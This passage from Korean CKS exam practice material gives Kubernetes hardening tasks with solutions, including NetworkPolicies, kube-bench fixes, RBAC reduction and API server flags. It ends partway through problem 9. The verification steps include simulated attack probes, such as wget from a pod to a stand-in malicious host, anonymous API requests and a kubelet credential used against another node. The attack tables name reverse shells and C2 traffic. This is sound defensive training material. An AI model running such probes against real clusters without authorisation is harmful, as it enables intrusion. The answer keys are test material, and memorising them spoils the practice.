# CKS 모의 실기 문제

> CKS(Certified Kubernetes Security Specialist) 시험 대비 실전 문제 40선이다.
> 각 문제는 실제 시험과 유사한 시나리오 기반으로 구성되어 있다.
> 도메인별 비율: Cluster Setup(4), Cluster Hardening(6), System Hardening(6), Minimize Microservice Vulnerabilities(8), Supply Chain Security(8), Monitoring/Logging/Runtime Security(8)

---

## Cluster Setup (10%) - 4문제

### 문제 1. [Cluster Setup] NetworkPolicy - Default Deny All

`restricted` 네임스페이스에 default deny all NetworkPolicy를 적용하라. 이 네임스페이스의 모든 Pod에 대해 Ingress와 Egress 트래픽을 모두 차단해야 한다.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
kubectl config use-context cluster1
```
```yaml
# deny-all.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: restricted
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```
```bash
kubectl apply -f deny-all.yaml

# 검증
kubectl get networkpolicy -n restricted
kubectl describe networkpolicy default-deny-all -n restricted
```

**검증 - 공격 시뮬레이션:**
```bash
# 네임스페이스 내 Pod 간 통신 차단 확인
kubectl -n restricted exec test-pod -- wget -qO- --timeout=2 http://other-svc:80
```
```text
wget: download timed out
command terminated with exit code 1
```
```bash
# 외부 Egress 차단 확인
kubectl -n restricted exec test-pod -- wget -qO- --timeout=2 http://google.com
```
```text
wget: download timed out
command terminated with exit code 1
```
```bash
# DNS 조차 차단되므로 nslookup도 실패
kubectl -n restricted exec test-pod -- nslookup kubernetes.default
```
```text
;; connection timed out; no servers could be reached
command terminated with exit code 1
```

`podSelector: {}`는 해당 네임스페이스의 모든 Pod를 선택한다. `policyTypes`에 Ingress와 Egress를 모두 지정하고, 허용 규칙을 비워두면 모든 트래픽이 차단된다.

**출제 의도:** 네임스페이스 레벨의 제로 트러스트 네트워크 정책 수립 능력을 검증한다. 기본 deny 정책 없이는 모든 Pod가 자유롭게 통신할 수 있어 횡적 이동(lateral movement)에 취약하다.

**핵심 원리:** NetworkPolicy는 CNI 플러그인(Calico, Cilium 등)이 iptables/eBPF 규칙으로 변환하여 커널 레벨에서 패킷을 필터링한다. `podSelector: {}`는 빈 라벨 셀렉터로, 해당 네임스페이스의 전체 Pod를 대상으로 지정하는 것이다. NetworkPolicy가 하나라도 존재하면 해당 Pod는 "정책 적용 대상"이 되어, 명시적으로 허용되지 않은 트래픽은 모두 차단된다.

**함정과 주의사항:**
- `policyTypes`에 `Egress`를 빠뜨리면 아웃바운드 트래픽은 여전히 허용된다. 시험에서 가장 흔한 실수이다.
- `policyTypes`를 아예 생략하면 `ingress` 필드가 있을 때만 Ingress 정책으로 인식되고, Egress는 정책 대상이 아닌 것으로 처리된다.
- CNI 플러그인이 NetworkPolicy를 지원하지 않으면(flannel 기본 모드 등) 정책이 적용되지 않는다. CKS 시험 환경에서는 지원하는 CNI가 설치되어 있다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 컨테이너 탈출 후 횡적 이동 | 네임스페이스 내 모든 Pod 간 통신 차단 |
| 데이터 유출(DNS 터널링 포함) | Egress 차단으로 외부 전송 불가 |
| 리버스 셸 연결 | 아웃바운드 연결 차단 |
</details>

---

### 문제 2. [Cluster Setup] NetworkPolicy - DNS 허용 및 특정 Pod 간 통신 허용

`restricted` 네임스페이스에서 `app=frontend` 라벨이 있는 Pod가 DNS(포트 53)와 `app=backend` 라벨이 있는 Pod의 포트 8080으로만 Egress 통신할 수 있도록 NetworkPolicy를 작성하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-egress
  namespace: restricted
spec:
  podSelector:
    matchLabels:
      app: frontend
  policyTypes:
  - Egress
  egress:
  - to: []
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
  - to:
    - podSelector:
        matchLabels:
          app: backend
    ports:
    - protocol: TCP
      port: 8080
```
```bash
kubectl apply -f frontend-egress.yaml

# 검증: frontend에서 backend로 통신 가능한지 확인
kubectl -n restricted exec frontend-pod -- wget -qO- --timeout=2 http://backend-svc:8080
# (성공)

# frontend에서 외부로 통신 불가 확인
kubectl -n restricted exec frontend-pod -- wget -qO- --timeout=2 http://google.com
# (실패: 타임아웃)
```

**검증 - 공격 시뮬레이션:**
```bash
# 허용된 통신: frontend -> backend:8080
kubectl -n restricted exec frontend-pod -- wget -qO- --timeout=2 http://backend-svc:8080
```
```text
<!DOCTYPE html>
<html>...</html>
```
```bash
# 차단된 통신: frontend -> 외부
kubectl -n restricted exec frontend-pod -- wget -qO- --timeout=2 http://malicious-site.com
```
```text
wget: download timed out
command terminated with exit code 1
```
```bash
# 차단된 통신: frontend -> 같은 네임스페이스의 다른 Pod
kubectl -n restricted exec frontend-pod -- wget -qO- --timeout=2 http://database-svc:5432
```
```text
wget: download timed out
command terminated with exit code 1
```
```bash
# DNS는 정상 동작 확인
kubectl -n restricted exec frontend-pod -- nslookup backend-svc.restricted.svc.cluster.local
```
```text
Server:    10.96.0.10
Address:   10.96.0.10#53

Name:      backend-svc.restricted.svc.cluster.local
Address:   10.96.45.12
```

DNS 허용을 위해 `to: []`(모든 대상)에 포트 53을 지정한다. DNS를 허용하지 않으면 서비스명으로 통신할 수 없다. backend로의 통신은 `podSelector`로 대상을 지정하고 포트 8080만 허용한다.

**출제 의도:** 마이크로서비스 간 최소 권한 네트워크 통신 설계 능력을 검증한다. default deny 위에 필요한 통신만 화이트리스트로 허용하는 패턴은 CKS 시험의 핵심이다.

**핵심 원리:** Kubernetes NetworkPolicy의 egress 규칙은 `to`(대상)와 `ports`(포트)의 AND 조합이다. 각 egress 배열 항목은 OR 관계이다. DNS 규칙에서 `to: []`는 "모든 대상"을 의미하며, kube-dns(CoreDNS)가 어느 네임스페이스에 있든 53번 포트로의 통신을 허용한다. CNI 플러그인은 이 규칙을 커널의 netfilter/eBPF 규칙으로 변환하여 L3/L4 레벨에서 패킷 필터링을 수행한다.

**함정과 주의사항:**
- DNS에 UDP만 허용하고 TCP를 빠뜨리는 실수가 많다. DNS 응답이 512바이트를 초과하면 TCP 폴백이 발생하므로 TCP 53도 반드시 열어야 한다.
- `to: []`와 `to`를 생략하는 것은 의미가 다르다. `to`를 생략하면 해당 egress 규칙이 모든 대상에 적용되지만, `to: []`도 동일한 효과이다. 그러나 `to: [{}]`는 "같은 네임스페이스의 모든 Pod"를 의미하므로 혼동하면 안 된다.
- 같은 egress 항목에 `to`와 `ports`를 함께 넣으면 AND 조건이다. DNS 규칙과 backend 규칙을 하나의 egress 항목에 합치면 "DNS 대상에게만 8080도 허용"이 되어 의도와 다르게 동작한다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| frontend 침해 후 DB 직접 접근 | backend만 허용되므로 DB 접근 차단 |
| C2 서버로 아웃바운드 연결 | 외부 Egress 차단으로 C2 통신 불가 |
| 내부 서비스 스캔 | 허용된 backend:8080 외 모든 포트/대상 차단 |

---

### 문제 3. [Cluster Setup] CIS Benchmark - kube-bench 실행 및 수정

마스터 노드에서 kube-bench를 실행하고, 다음 항목이 FAIL이면 PASS가 되도록 수정하라:
1. `1.2.1` - anonymous-auth가 false로 설정되어야 한다
2. `1.2.18` - insecure-bind-address가 설정되어 있지 않아야 한다
3. `1.2.20` - audit-log-path가 설정되어야 한다

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 현재 상태 확인
kube-bench run --targets master --check 1.2.1,1.2.18,1.2.20

# 2. API server 매니페스트 백업
cp /etc/kubernetes/manifests/kube-apiserver.yaml /tmp/kube-apiserver.yaml.bak

# 3. API server 매니페스트 수정
vi /etc/kubernetes/manifests/kube-apiserver.yaml
```

수정할 플래그들:
```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    # 수정/추가할 항목:
    - --anonymous-auth=false
    # --insecure-bind-address 라인이 있으면 삭제
    - --audit-log-path=/var/log/kubernetes/audit/audit.log
    # audit-log 관련 volume mount도 추가 필요
    volumeMounts:
    - name: audit-log
      mountPath: /var/log/kubernetes/audit/
  volumes:
  - name: audit-log
    hostPath:
      path: /var/log/kubernetes/audit/
      type: DirectoryOrCreate
```
```bash
# 4. 로그 디렉토리 생성
mkdir -p /var/log/kubernetes/audit/

# 5. API server 재시작 대기
watch crictl ps | grep kube-apiserver

# 6. 재점검
kube-bench run --targets master --check 1.2.1,1.2.18,1.2.20
# 세 항목 모두 [PASS]로 표시되어야 한다
```

`--insecure-bind-address`는 해당 줄 자체를 삭제해야 한다. `--audit-log-path`를 추가할 때는 반드시 해당 경로에 대한 hostPath volume과 volumeMount도 함께 추가해야 한다.

**검증 - 공격 시뮬레이션:**
```bash
# kube-bench 재점검으로 PASS 확인
kube-bench run --targets master --check 1.2.1,1.2.18,1.2.20
```
```text
[PASS] 1.2.1 Ensure that the --anonymous-auth argument is set to false
[PASS] 1.2.18 Ensure that the --insecure-bind-address argument is not set
[PASS] 1.2.20 Ensure that the --audit-log-path argument is set
```
```bash
# 익명 인증 차단 확인
curl -k https://localhost:6443/api/v1/namespaces
```
```text
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "Unauthorized",
  "code": 401
}
```
```bash
# audit 로그 기록 확인
tail -1 /var/log/kubernetes/audit/audit.log | jq '.verb, .user.username'
```
```text
"get"
"system:anonymous"
```

**출제 의도:** CIS Kubernetes Benchmark 기반의 클러스터 보안 점검 및 수정 능력을 검증한다. kube-bench 출력을 읽고 API server 매니페스트를 정확하게 수정하는 실전 능력이 핵심이다.

**핵심 원리:** kube-bench는 CIS Benchmark 권고사항을 자동 검사하는 도구이다. API server는 Static Pod로 `/etc/kubernetes/manifests/`에 매니페스트가 위치하며, kubelet이 파일 변경을 inotify로 감지하여 컨테이너를 자동 재시작한다. `--anonymous-auth=false`는 인증 헤더 없는 요청을 system:anonymous 대신 거부한다. `--insecure-bind-address`는 TLS 없이 API를 노출하므로 MITM 공격에 취약하다.

**함정과 주의사항:**
- `--audit-log-path` 추가 시 해당 디렉토리에 대한 hostPath volume과 volumeMount를 빠뜨리면 API server가 시작되지 않는다. 매니페스트 수정 전 반드시 백업하라.
- `--insecure-bind-address`는 "값을 변경"하는 것이 아니라 "줄 자체를 삭제"해야 한다.
- API server가 재시작되지 않으면 `crictl logs <container-id>`로 에러 로그를 확인하라. 오타가 있으면 API server가 기동 불가 상태가 된다.
- 백업 파일(`/tmp/kube-apiserver.yaml.bak`)을 반드시 만들어야 롤백이 가능하다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 익명 API 접근으로 클러스터 정보 수집 | anonymous-auth=false로 인증 없는 접근 차단 |
| 평문 HTTP로 API 도청 | insecure-bind-address 제거로 HTTP 바인딩 차단 |
| 감사 추적 없는 악성 API 호출 | audit-log-path 설정으로 모든 API 호출 기록 |
</details>

---

### 문제 4. [Cluster Setup] 바이너리 검증

워커 노드 `node01`에서 kubelet 바이너리의 무결성을 확인하라. 공식 릴리스의 sha512 해시값과 비교하여 바이너리가 변조되지 않았는지 검증하라. kubelet 버전은 v1.29.0이다.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 워커 노드에 SSH 접속
ssh node01

# 2. 현재 kubelet 바이너리의 해시값 계산
sha512sum /usr/bin/kubelet

# 3. 공식 해시값 다운로드
curl -LO https://dl.k8s.io/v1.29.0/bin/linux/amd64/kubelet.sha512

# 4. 해시값 비교
echo "$(cat kubelet.sha512)  /usr/bin/kubelet" | sha512sum --check
# OK 출력 시: 무결성 확인
# FAILED 출력 시: 바이너리 변조 의심

# 만약 변조된 경우, 공식 바이너리로 교체
curl -LO https://dl.k8s.io/v1.29.0/bin/linux/amd64/kubelet
chmod +x kubelet
mv kubelet /usr/bin/kubelet
systemctl restart kubelet
```

**검증 - 공격 시뮬레이션:**
```bash
# 정상 바이너리 해시 비교
echo "$(cat kubelet.sha512)  /usr/bin/kubelet" | sha512sum --check
```
```text
/usr/bin/kubelet: OK
```
```bash
# 변조된 경우 출력
echo "$(cat kubelet.sha512)  /usr/bin/kubelet" | sha512sum --check
```
```text
/usr/bin/kubelet: FAILED
sha512sum: WARNING: 1 computed checksum did NOT match
```
```bash
# 교체 후 kubelet 정상 동작 확인
systemctl status kubelet
```
```text
● kubelet.service - kubelet: The Kubernetes Node Agent
     Active: active (running) since ...
```
```bash
# 노드 상태 확인
kubectl get node node01
```
```text
NAME     STATUS   ROLES    AGE   VERSION
node01   Ready    <none>   10d   v1.29.0
```

`sha512sum --check` 명령은 파일의 해시값을 계산하여 제공된 해시값과 비교한다. 결과가 `OK`이면 무결성이 확인된 것이고, `FAILED`이면 바이너리가 변조된 것이다.

**출제 의도:** 공급망 공격(supply chain attack)에 의한 바이너리 변조를 탐지하는 능력을 검증한다. 클러스터 컴포넌트의 무결성 검증은 보안 기본 원칙이다.

**핵심 원리:** SHA-512는 암호학적 해시 함수로, 입력 데이터가 1비트만 달라져도 완전히 다른 해시값을 출력한다(avalanche effect). 공격자가 kubelet 바이너리에 백도어를 삽입하면 해시값이 변경되므로 변조 탐지가 가능하다. 공식 릴리스 해시값은 Kubernetes GitHub release 페이지에서 HTTPS로 제공되므로 신뢰할 수 있다.

**함정과 주의사항:**
- `sha512sum`의 입력 포맷은 "해시값  파일경로"이며, 해시값과 파일경로 사이에 공백 2개가 필요하다. 공백 1개이면 검증이 실패한다.
- kubelet 바이너리 교체 후 `systemctl restart kubelet`을 잊으면 기존 프로세스가 계속 실행된다.
- 아키텍처(amd64/arm64)를 확인하라. 잘못된 아키텍처의 바이너리를 다운로드하면 실행 불가이다.
- 바이너리 교체 시 `chmod +x`를 빠뜨리면 실행 권한이 없어 kubelet이 시작되지 않는다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 공급망 공격으로 kubelet 백도어 삽입 | 해시 비교로 변조 탐지 |
| 노드 침입 후 kubelet 교체 | 정기적 무결성 검사로 탐지 |
| 중간자 공격으로 다운로드 시 바이너리 변조 | HTTPS + 해시 검증으로 이중 보호 |
</details>

---

## Cluster Hardening (15%) - 6문제

### 문제 5. [Cluster Hardening] RBAC - 과도한 권한 축소

`production` 네임스페이스에 `dev-team` Role이 있다. 이 Role은 모든 리소스에 대해 모든 권한(`*`)을 가지고 있다. 이를 수정하여 Pod와 Service에 대한 get, list, watch 권한만 허용하고, Deployment에 대한 get, list, watch, update 권한만 허용하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 현재 Role 확인
kubectl get role dev-team -n production -o yaml
```
```yaml
# 수정된 Role
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: dev-team
  namespace: production
rules:
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch", "update"]
```
```bash
kubectl apply -f dev-team-role.yaml

# 검증
kubectl auth can-i delete pods --as=system:serviceaccount:production:dev-sa -n production
# no
kubectl auth can-i get pods --as=system:serviceaccount:production:dev-sa -n production
# yes
kubectl auth can-i update deployments.apps --as=system:serviceaccount:production:dev-sa -n production
# yes
kubectl auth can-i create deployments.apps --as=system:serviceaccount:production:dev-sa -n production
# no
```

`*` 와일드카드를 제거하고 필요한 verb와 resource만 명시적으로 나열하는 것이 최소 권한 원칙이다. Deployment는 `apps` apiGroup에 속하므로 별도로 지정해야 한다.

**검증 - 공격 시뮬레이션:**
```bash
# 축소된 권한으로 허용된 작업 확인
kubectl auth can-i get pods --as=system:serviceaccount:production:dev-sa -n production
```
```text
yes
```
```bash
# 차단된 작업 확인: Secret 접근 시도
kubectl auth can-i get secrets --as=system:serviceaccount:production:dev-sa -n production
```
```text
no
```
```bash
# 차단된 작업 확인: Pod 삭제 시도
kubectl auth can-i delete pods --as=system:serviceaccount:production:dev-sa -n production
```
```text
no
```
```bash
# 차단된 작업 확인: Deployment 생성 시도
kubectl auth can-i create deployments.apps --as=system:serviceaccount:production:dev-sa -n production
```
```text
no
```

**출제 의도:** 과도한 RBAC 권한을 식별하고 최소 권한 원칙(Principle of Least Privilege)에 맞게 축소하는 능력을 검증한다. `*` 와일드카드는 모든 리소스/동작을 허용하므로 실질적으로 cluster-admin과 동일한 위험이다.

**핵심 원리:** Kubernetes RBAC는 Role(권한 정의)과 RoleBinding(주체에 권한 부여)으로 구성된다. API server의 인가 모듈이 매 요청마다 주체(user/SA)의 Role 규칙을 평가하여 허용/거부를 결정한다. `apiGroups: [""]`는 core API 그룹(Pod, Service 등)이고, `apiGroups: ["apps"]`는 Deployment, ReplicaSet 등이 속하는 그룹이다.

**함정과 주의사항:**
- Deployment의 apiGroup을 `""`(core)로 지정하면 권한이 적용되지 않는다. 반드시 `"apps"`를 지정해야 한다.
- `kubectl auth can-i`로 검증할 때 `--as` 플래그의 SA 형식은 `system:serviceaccount:<namespace>:<sa-name>`이다.
- Role과 ClusterRole을 혼동하면 안 된다. Role은 네임스페이스 스코프, ClusterRole은 클러스터 스코프이다.
- `resources`에 서브리소스(예: `pods/log`, `pods/exec`)를 별도로 지정해야 한다. `pods`만 지정하면 exec 권한은 포함되지 않는다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| SA 토큰 탈취 후 Secret 읽기 | Secret 리소스 접근 권한 제거 |
| SA 토큰으로 Pod 삭제/생성 | delete/create verb 제거 |
| 권한 상승 공격(RoleBinding 생성) | RoleBinding 리소스 접근 권한 없음 |
</details>

---

### 문제 6. [Cluster Hardening] ServiceAccount 보안

`web-app` 네임스페이스에서 실행 중인 `web-pod` Pod가 default ServiceAccount를 사용하고 있다. 다음 작업을 수행하라:
1. `web-sa`라는 새 ServiceAccount를 생성하고 `automountServiceAccountToken: false`를 설정하라
2. `web-pod`가 새 ServiceAccount를 사용하도록 수정하라

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. ServiceAccount 생성
kubectl create serviceaccount web-sa -n web-app --dry-run=client -o yaml > web-sa.yaml
```
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-sa
  namespace: web-app
automountServiceAccountToken: false
```
```bash
kubectl apply -f web-sa.yaml

# 2. Pod 수정 (Pod는 직접 수정 불가하므로 삭제 후 재생성)
kubectl get pod web-pod -n web-app -o yaml > web-pod.yaml
```

web-pod.yaml을 수정:
```yaml
spec:
  serviceAccountName: web-sa
  automountServiceAccountToken: false
  containers:
  - name: web
    image: nginx:1.25
```
```bash
kubectl delete pod web-pod -n web-app
kubectl apply -f web-pod.yaml

# 검증: 토큰이 마운트되지 않았는지 확인
kubectl exec web-pod -n web-app -- ls /var/run/secrets/kubernetes.io/serviceaccount/
# No such file or directory
```

**검증 - 공격 시뮬레이션:**
```bash
# 토큰 마운트 경로가 존재하지 않는지 확인
kubectl exec web-pod -n web-app -- ls /var/run/secrets/kubernetes.io/serviceaccount/
```
```text
ls: /var/run/secrets/kubernetes.io/serviceaccount/: No such file or directory
command terminated with exit code 1
```
```bash
# 컨테이너 내부에서 API server 접근 시도 (토큰이 없으므로 실패)
kubectl exec web-pod -n web-app -- curl -sk https://kubernetes.default.svc/api/v1/namespaces
```
```text
{
  "kind": "Status",
  "status": "Failure",
  "message": "Unauthorized",
  "code": 401
}
```
```bash
# ServiceAccount 확인
kubectl get pod web-pod -n web-app -o jsonpath='{.spec.serviceAccountName}'
```
```text
web-sa
```

ServiceAccount의 `automountServiceAccountToken: false` 설정은 해당 SA를 사용하는 모든 Pod에 적용된다. Pod 레벨에서도 설정할 수 있으며, Pod 레벨 설정이 SA 레벨 설정보다 우선한다.

**출제 의도:** ServiceAccount 토큰의 자동 마운트가 불필요한 워크로드에서 토큰 노출 위험을 제거하는 능력을 검증한다. API server에 접근할 필요가 없는 애플리케이션에 SA 토큰을 마운트하면 컨테이너 침해 시 클러스터 API 접근 수단을 공격자에게 제공하는 셈이다.

**핵심 원리:** Kubernetes는 기본적으로 모든 Pod에 ServiceAccount 토큰을 projected volume으로 마운트한다. 이 토큰은 JWT 형식이며, API server에 대한 인증에 사용된다. `automountServiceAccountToken: false`를 설정하면 kubelet이 Pod 생성 시 토큰 볼륨을 마운트하지 않는다. Pod 레벨 설정 > SA 레벨 설정 순서로 우선순위가 적용된다.

**함정과 주의사항:**
- `serviceAccountName`과 `serviceAccount`(deprecated) 필드를 혼동하면 안 된다. `serviceAccountName`을 사용해야 한다.
- Pod의 `serviceAccountName`은 immutable 필드이므로 직접 수정할 수 없다. 반드시 삭제 후 재생성해야 한다.
- `automountServiceAccountToken`을 SA와 Pod 양쪽 모두에 설정하면, Pod 레벨 설정이 우선한다. Pod에 `true`를 설정하면 SA에 `false`가 있어도 토큰이 마운트된다.
- default SA에 `automountServiceAccountToken: false`를 설정하는 것도 좋은 방어 수단이다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 컨테이너 RCE 후 SA 토큰 탈취 | 토큰 미마운트로 탈취 대상 자체가 없음 |
| SA 토큰으로 Secret 읽기/Pod 생성 | API server 인증 수단 제거 |
| SSRF를 통한 metadata API 접근 | 토큰이 없으므로 API 호출 불가 |
</details>

---

### 문제 7. [Cluster Hardening] API Server 접근 제한

API Server의 다음 보안 설정을 수정하라:
1. 익명 인증을 비활성화하라 (`--anonymous-auth=false`)
2. 인가 모드를 `Node,RBAC`로 설정하라
3. `NodeRestriction` admission plugin을 활성화하라

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 매니페스트 백업
cp /etc/kubernetes/manifests/kube-apiserver.yaml /tmp/kube-apiserver.yaml.bak

# 2. 매니페스트 수정
vi /etc/kubernetes/manifests/kube-apiserver.yaml
```

수정할 플래그:
```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --anonymous-auth=false
    - --authorization-mode=Node,RBAC
    - --enable-admission-plugins=NodeRestriction,PodSecurity
    # ... 기존 플래그들
```
```bash
# 3. API server 재시작 대기
watch crictl ps | grep kube-apiserver

# 4. 정상 동작 확인
kubectl get nodes

# 5. 익명 접근 차단 확인
curl -k https://localhost:6443/api/v1/namespaces
# 401 Unauthorized (익명 접근 차단됨)
```

**검증 - 공격 시뮬레이션:**
```bash
# 익명 인증 차단 확인
curl -sk https://localhost:6443/api/v1/namespaces
```
```text
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "Unauthorized",
  "code": 401
}
```
```bash
# NodeRestriction 동작 확인: 노드가 다른 노드의 라벨을 수정할 수 없음
# (node01의 kubelet 인증서로 node02의 라벨 변경 시도 시 차단)
kubectl --kubeconfig=/etc/kubernetes/kubelet.conf label node node02 test=malicious
```
```text
Error from server (Forbidden): nodes "node02" is forbidden: node "node01" is not allowed to modify node "node02"
```
```bash
# 인가 모드 확인
kubectl -v=6 get nodes 2>&1 | grep authorization
# RBAC와 Node 인가 모듈이 동작 중
```

API server 매니페스트를 수정하면 kubelet이 변경을 감지하고 자동으로 API server를 재시작한다. 재시작에 30초~1분 정도 소요될 수 있다. `watch crictl ps`로 컨테이너 상태를 모니터링하라.

**출제 의도:** API server의 인증(AuthN)/인가(AuthZ)/어드미션 3단계 보안 체계를 강화하는 능력을 검증한다. 각 단계의 역할과 설정 방법을 정확히 이해해야 한다.

**핵심 원리:** API server의 요청 처리 파이프라인은 Authentication -> Authorization -> Admission Control 순서이다. `--anonymous-auth=false`는 1단계에서 미인증 요청을 거부한다. `--authorization-mode=Node,RBAC`는 2단계에서 Node 인가자(kubelet 전용)와 RBAC 인가자를 순서대로 평가한다. `NodeRestriction` 어드미션 플러그인은 3단계에서 kubelet이 자기 노드에 스케줄된 리소스만 수정할 수 있도록 제한한다.

**함정과 주의사항:**
- `--authorization-mode`의 순서가 중요하다. `Node,RBAC` 순서로 지정하면 Node 인가자가 먼저 평가되고, 판단 불가 시 RBAC로 넘어간다. 순서를 바꾸면 동작은 하지만 권장되지 않는다.
- `--enable-admission-plugins`에 기존 플러그인을 유지하면서 `NodeRestriction`을 추가해야 한다. 기존 목록을 덮어쓰면 필수 플러그인이 빠질 수 있다.
- `--anonymous-auth=false` 설정 후 liveness probe가 익명 인증에 의존하고 있었다면 API server가 비정상으로 판단될 수 있다. 그러나 기본 liveness probe는 localhost에서 동작하므로 보통 문제없다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 익명 사용자의 API 정보 수집 | anonymous-auth=false로 차단 |
| 침해된 kubelet이 다른 노드 리소스 수정 | NodeRestriction으로 자기 노드만 접근 허용 |
| ABAC 기반 우회 공격 | RBAC 전용 인가로 정밀한 접근 제어 |
</details>

---

### 문제 8. [Cluster Hardening] kubeadm 업그레이드

클러스터의 컨트롤 플레인을 v1.28.5에서 v1.29.0으로 업그레이드하라. 컨트롤 플레인 노드에서 kubeadm, kubelet, kubectl을 모두 업그레이드해야 한다.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. 업그레이드 가능 버전 확인
kubeadm upgrade plan

# 2. kubeadm 업그레이드
apt-get update
apt-cache madison kubeadm | grep 1.29
apt-get install -y kubeadm=1.29.0-1.1

# 3. kubeadm 버전 확인
kubeadm version

# 4. 컨트롤 플레인 업그레이드
kubeadm upgrade apply v1.29.0

# 5. 노드 드레인
kubectl drain controlplane --ignore-daemonsets --delete-emptydir-data

# 6. kubelet, kubectl 업그레이드
apt-get install -y kubelet=1.29.0-1.1 kubectl=1.29.0-1.1

# 7. kubelet 재시작
systemctl daemon-reload
systemctl restart kubelet

# 8. 노드 uncordon
kubectl uncordon controlplane

# 9. 버전 확인
kubectl get nodes
# controlplane이 v1.29.0으로 표시되어야 한다
```

업그레이드는 반드시 한 마이너 버전씩 수행해야 한다. 컨트롤 플레인을 먼저 업그레이드한 후 워커 노드를 업그레이드한다. 워커 노드는 `kubeadm upgrade node` 명령을 사용한다.

**검증 - 공격 시뮬레이션:**
```bash
# 컨트롤 플레인 버전 확인
kubectl get nodes
```
```text
NAME           STATUS   ROLES           AGE   VERSION
controlplane   Ready    control-plane   30d   v1.29.0
node01         Ready    <none>          30d   v1.28.5
```
```bash
# API server 버전 확인
kubectl version --short
```
```text
Client Version: v1.29.0
Server Version: v1.29.0
```
```bash
# 컴포넌트 상태 확인
kubectl get pods -n kube-system | grep -E 'kube-apiserver|kube-controller|kube-scheduler|etcd'
```
```text
etcd-controlplane                      1/1     Running   0          2m
kube-apiserver-controlplane            1/1     Running   0          2m
kube-controller-manager-controlplane   1/1     Running   0          2m
kube-scheduler-controlplane            1/1     Running   0          2m
```

**출제 의도:** 보안 패치가 포함된 Kubernetes 버전 업그레이드를 안전하게 수행하는 능력을 검증한다. CVE 수정은 새 버전에 포함되므로 정기적 업그레이드는 보안의 기본이다.

**핵심 원리:** kubeadm은 컨트롤 플레인 컴포넌트를 Static Pod로 관리한다. `kubeadm upgrade apply`는 새 버전의 매니페스트를 `/etc/kubernetes/manifests/`에 배치하고, kubelet이 이를 감지하여 컨테이너를 교체한다. etcd 스키마 마이그레이션도 자동으로 수행된다. drain은 노드의 워크로드를 다른 노드로 이동시켜 업그레이드 중 서비스 중단을 방지한다.

**함정과 주의사항:**
- kubeadm을 먼저 업그레이드한 후 `kubeadm upgrade apply`를 실행해야 한다. 순서를 바꾸면 이전 버전의 kubeadm이 새 버전 업그레이드를 지원하지 않는다.
- `kubeadm upgrade apply`와 `kubeadm upgrade node`를 혼동하면 안 된다. 전자는 컨트롤 플레인, 후자는 워커 노드(또는 추가 컨트롤 플레인)용이다.
- drain 시 `--ignore-daemonsets`를 빠뜨리면 DaemonSet Pod 때문에 드레인이 실패한다.
- kubelet/kubectl 업그레이드 후 `systemctl daemon-reload && systemctl restart kubelet`을 반드시 수행해야 한다.

**공격-방어 매핑:**
| 공격 벡터 | 방어 효과 |
|---|---|
| 알려진 CVE 익스플로잇 | 보안 패치가 적용된 버전으로 업그레이드 |
| API server 취약점 공격 | 최신 버전의 보안 수정 반영 |
| kubelet 권한 상승 취약점 | kubelet 바이너리 업그레이드로 패치 |
</details>

---

### 문제 9. [Cluster Hardening] cluster-admin ClusterRoleBinding 감사

클러스터에서 `cluster-admin` ClusterRole에 바인딩된 모든 ClusterRoleBinding을 찾아라. 시스템 컴포넌트(system:으로 시작하는 주체)를 제외하고, 불필요하게 cluster-admin 권한을 가진 사용자나 ServiceAccount를 식별하라.

<details>
<summary>풀이 확인</summary>

**풀이:**
```bash
# 1. cluster-admin에 바인딩된 모든 ClusterRoleBinding 찾기
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name == "cluster-admin") |
  "\(.metadata.name): \(.subjects // [] | .[] | "\(.kind)/\(.name) (ns: \(.namespace // "cluster-wide"))")"'

# 2. 시스템 컴포넌트 제외하고 확인
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name == "cluster-admin") |
  .subjects[]? | select(.name | startswith("system:") | not) |
  "\(.kind)/\(.name)"'

# 3. 불필요한 바인딩이 발견되면 삭제
kubectl delete clusterrolebinding <suspicious-binding-name>

# 4. 또는 더 제한적인 Role로 교체
kubectl create clusterrolebinding limited-access \
  --clusterrole=view \
  --user=jane \
  --dry-run=client -o yaml | kubectl apply -f -
```

**검증 - 공격 시뮬레이션:**
```bash
# 비시스템 주체 중 cluster-admin 바인딩 식별
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name == "cluster-admin") |
  .subjects[]? | select(.name | startswith("system:") | not) |
  "\(.kind)/\(.name)"'
```
```text
User/jane
ServiceAccount/ci-pipeline
```
```bash
# 삭제 전: jane이 Secret을 읽을 수 있는지 확인
kubectl auth can-i get secrets --all-namespaces --as=jane
```
```text
yes
```
```bash
